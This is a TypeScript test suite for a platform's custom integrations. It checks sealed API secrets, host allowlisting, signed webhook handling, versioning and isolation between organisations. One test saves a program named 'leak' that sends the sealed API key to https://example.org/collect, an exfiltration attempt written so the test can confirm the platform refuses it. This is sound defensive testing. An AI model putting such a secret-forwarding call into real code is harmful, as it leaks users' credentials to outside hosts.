import { once } from 'node:events';
import { createServer, type Server } from 'node:http';
import { afterAll, beforeAll, describe, expect, it } from 'vite-plus/test';
import { hmacSha256 } from '~/lib/crypto';
import { useAutomations } from './automations.fixture';
import { useTestDatabase } from './db';
import { settle } from './settle';

const API_KEY = 'sk_live_boat_0123456789';

const WEBHOOK_SECRET = 'whsec_boat_0123456789';

interface Seen {
  path: string;
  authorization: string;
  body: string;
}

describe('custom integrations', { timeout: 120_000 }, () => {
  useTestDatabase();

  const t = useAutomations();
  const seen: Seen[] = [];
  let service: Server;
  let host = '';
  let integrationId = '';

  const saveAction = (key: string, code: string) =>
    t.owner().integrations.saveProgram({
      integrationId,
      kind: 'action',
      key,
      label: `Boat ${key}`,
      fields: [{ key: 'name', label: 'Name', type: 'text', required: true }],
      outputs: [{ key: 'id', label: 'Boat', type: 'text' }],
      code,
    });

  const callsTo = (path: string) => seen.filter((call) => call.path === path);

  beforeAll(async () => {
    service = createServer((req, res) => {
      const chunks: Buffer[] = [];

      req.on('data', (chunk: Buffer) => chunks.push(chunk));
      req.on('end', () => {
        const authorization = req.headers.authorization ?? '';

        seen.push({
          path: req.url ?? '',
          authorization,
          body: Buffer.concat(chunks).toString('utf8'),
        });
        res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify({ id: 'boat_1', sent: authorization }));
      });
    }).listen(0, '127.0.0.1');
    await once(service, 'listening');

    const address = service.address();

    if (!address || typeof address === 'string') throw new Error('not listening on a port');

    host = `127.0.0.1:${address.port}`;

    const integration = await t.owner().integrations.create({
      key: 'boat',
      name: 'Boat',
      hosts: [host],
    });

    integrationId = integration.id;
    await t.owner().integrations.setSecrets({
      id: integrationId,
      secrets: { apiKey: API_KEY, webhookSecret: WEBHOOK_SECRET },
    });
  });

  afterAll(() => new Promise<void>((resolve) => service.close(() => resolve())));

  it('runs as an automation step with the sealed key, which the program and the run never hold', async () => {
    await saveAction(
      'create',
      `const res = await request({
        method: 'POST',
        url: 'http://${host}/boats',
        headers: { Authorization: 'Bearer {{secret.apiKey}}' },
        body: { name: input.name },
      });
      return { id: res.body.id, sent: res.body.sent };`,
    );

    const automationId = await t.active('Boat for Bold', {
      trigger: {
        kind: 'event',
        event: 'core.customer.created',
        conditions: {
          match: 'all',
          rules: [{ path: 'subject.firstName', op: 'eq', value: 'Bold' }],
        },
      },
      steps: [
        {
          id: 'boat',
          type: 'action',
          action: 'integrations.boat.create',
          input: { name: '{{subject.firstName}}' },
        },
      ],
    });

    await t.owner().customers.create({ firstName: 'Bold' });
    await settle();

    const [run] = await t.runsOf(automationId);
    const detail = await t.owner().automations.run({ runId: run?.id ?? '' });

    expect(detail.run.status).toBe('succeeded');
    expect(callsTo('/boats')).toEqual([
      { path: '/boats', authorization: `Bearer ${API_KEY}`, body: '{"name":"Bold"}' },
    ]);
    expect(detail.steps[0]?.output).toEqual({ id: 'boat_1', sent: 'Bearer [sealed]' });
    expect(JSON.stringify(detail)).not.toContain(API_KEY);
  });

  it('never returns a sealed value, only its name', async () => {
    const detail = await t.owner().integrations.get({ id: integrationId });

    expect(detail.sealedNames).toEqual(['apiKey', 'webhookSecret']);
    expect(JSON.stringify(detail)).not.toContain(API_KEY);
    expect(JSON.stringify(await t.owner().integrations.list({}))).not.toContain(API_KEY);
  });

  it('refuses a host the member did not allow', async () => {
    const program = await saveAction(
      'leak',
      `return request({ url: 'https://example.org/collect', headers: { 'X-Key': '{{secret.apiKey}}' } });`,
    );

    const refused = await t.owner().integrations.testProgram({ id: program.id });

    expect(refused.ok).toBe(false);
    expect(JSON.stringify(refused)).toContain("example.org is not one of Boat's hosts");
    expect(seen.some((call) => call.path === '/collect')).toBe(false);
  });

  it('lists the action for automations and refuses one whose integration is gone', async () => {
    const { actions } = await t.owner().automations.catalog({});

    expect(actions.find((action) => action.type === 'integrations.boat.create')).toMatchObject({
      label: 'Boat create',
      source: 'Boat',
      fields: [expect.objectContaining({ key: 'name', required: true })],
    });

    const draft = await t.owner().automations.create({
      name: 'No such action',
      definition: {
        trigger: { kind: 'manual' },
        steps: [{ id: 'gone', type: 'action', action: 'integrations.boat.nope', input: {} }],
      },
    });

    await expect(t.owner().automations.activate({ id: draft.id })).rejects.toThrow(
      'unknown action integrations.boat.nope',
    );
  });

  it('keeps each version and makes an earlier one live again', async () => {
    const first = await saveAction('versioned', 'return { made: "first" };');
    const second = await saveAction('versioned', 'return { made: "second" };');

    expect([first.version, second.version]).toEqual([1, 2]);
    expect(await t.owner().integrations.testProgram({ id: first.id })).toMatchObject({
      result: { made: 'second' },
    });

    const restored = await t.owner().integrations.restoreProgram({ id: first.id, version: 1 });

    expect(restored.version).toBe(3);
    expect(await t.owner().integrations.testProgram({ id: first.id })).toMatchObject({
      result: { made: 'first' },
    });
    expect(
      (await t.owner().integrations.programVersions({ id: first.id })).data.map(
        (version) => version.version,
      ),
    ).toEqual([3, 2, 1]);
  });

  it('turns a signed incoming call into an event that starts an automation, once', async () => {
    const program = await t.owner().integrations.saveProgram({
      integrationId,
      kind: 'incoming',
      key: 'hook',
      label: 'Boat events',
      events: [
        {
          key: 'boat_created',
          label: 'Boat created',
          fields: [{ key: 'boatId', label: 'Boat', type: 'text' }],
        },
      ],
      code: `const ok = await verify(incoming.headers['x-boat-signature'] ?? '', incoming.rawBody, 'webhookSecret');
      if (!ok) return null;
      return { event: 'boat_created', payload: { boatId: incoming.body.id }, dedupeKey: incoming.body.eventId };`,
    });

    const automationId = await t.active('Tell the service', {
      trigger: { kind: 'event', event: 'integrations.boat.boat_created' },
      steps: [
        {
          id: 'tell',
          type: 'action',
          action: 'core.webhook.post',
          input: { url: `http://${host}/told`, body: { boat: '{{event.payload.boatId}}' } },
        },
      ],
    });

    const path = new URL(program.address ?? '').pathname;
    const body = JSON.stringify({ id: 'boat_7', eventId: 'evt_1' });

    const call = (signature: string) =>
      fetch(t.url(path), {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-boat-signature': signature },
        body,
      });

    const signed = `sha256=${hmacSha256(WEBHOOK_SECRET, body, 'hex')}`;

    expect((await call('sha256=00')).status).toBe(200);
    await settle();
    expect(await t.runsOf(automationId)).toHaveLength(0);

    expect((await call(signed)).status).toBe(200);
    expect((await call(signed)).status).toBe(200);
    await settle();

    expect(await t.runsOf(automationId)).toHaveLength(1);
    expect(callsTo('/told').map((told) => told.body)).toEqual(['{"boat":"boat_7"}']);
  });

  it('refuses an incoming address with a forged signature', async () => {
    const detail = await t.owner().integrations.get({ id: integrationId });
    const hook = detail.programs.find((program) => program.kind === 'incoming');
    const path = new URL(hook?.address ?? '').pathname;

    const forged = await fetch(t.url(`${path.slice(0, path.lastIndexOf('/'))}/forged`), {
      method: 'POST',
    });

    expect(forged.status).toBe(403);
  });

  it("keeps another organisation out of an organisation's integrations", async () => {
    const detail = await t.owner().integrations.get({ id: integrationId });
    const [program] = detail.programs;

    expect((await t.other().integrations.list({})).data).toEqual([]);
    await expect(t.other().integrations.get({ id: integrationId })).rejects.toMatchObject({
      status: 404,
      code: 'NOT_FOUND',
    });
    await expect(
      t.other().integrations.testProgram({ id: program?.id ?? '' }),
    ).rejects.toMatchObject({ status: 404, code: 'NOT_FOUND' });
    await expect(
      t.other().integrations.setSecrets({ id: integrationId, secrets: { apiKey: 'theirs' } }),
    ).rejects.toMatchObject({ status: 404, code: 'NOT_FOUND' });
  });

  it('offers the declared outputs at once, then corrects them from what a run really answered', async () => {
    const outputsOf = async () =>
      (await t.owner().automations.catalog({})).actions.find(
        (action) => action.type === 'integrations.boat.healed',
      )?.outputs;

    const program = await t.owner().integrations.saveProgram({
      integrationId,
      kind: 'action',
      key: 'healed',
      label: 'Healed',
      outputs: [{ key: 'id', label: 'Boat', type: 'number' }],
      code: 'return { id: "boat_1", crewSize: 4, owner: { name: "Bold" } };',
    });

    expect(await outputsOf()).toEqual([{ key: 'id', label: 'Boat', type: 'number' }]);

    await t.owner().integrations.testProgram({ id: program.id });

    expect(await outputsOf()).toEqual([
      { key: 'id', label: 'Boat', type: 'text' },
      { key: 'crewSize', label: 'Crew size', type: 'number' },
    ]);
  });

  it('adds an event the code publishes without declaring it, with what it carried', async () => {
    const program = await t.owner().integrations.saveProgram({
      integrationId,
      kind: 'incoming',
      key: 'undeclared',
      label: 'Undeclared',
      code: 'return { event: "boat_sunk", payload: { boatId: incoming.body.id, depth: incoming.body.depth } };',
    });

    const sent = await fetch(t.url(new URL(program.address ?? '').pathname), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ id: 'boat_9', depth: 12 }),
    });

    expect(sent.status).toBe(200);
    await settle();

    const { triggers } = await t.owner().automations.catalog({});

    expect(
      triggers.find((trigger) => trigger.type === 'integrations.boat.boat_sunk'),
    ).toMatchObject({
      label: 'Boat sunk',
      fields: [
        { key: 'boatId', label: 'Boat id', type: 'text' },
        { key: 'depth', label: 'Depth', type: 'number' },
      ],
    });
  });

  it('answers 409 TAKEN for a key another integration holds', async () => {
    await expect(
      t.owner().integrations.create({ key: 'boat', name: 'Second boat', hosts: [host] }),
    ).rejects.toMatchObject({ status: 409, code: 'TAKEN', data: { field: 'key' } });
  });

  it('needs integrations.manage', async () => {
    await expect(t.member().integrations.list({})).rejects.toMatchObject({
      status: 403,
      code: 'NOT_ALLOWED',
    });
  });
});
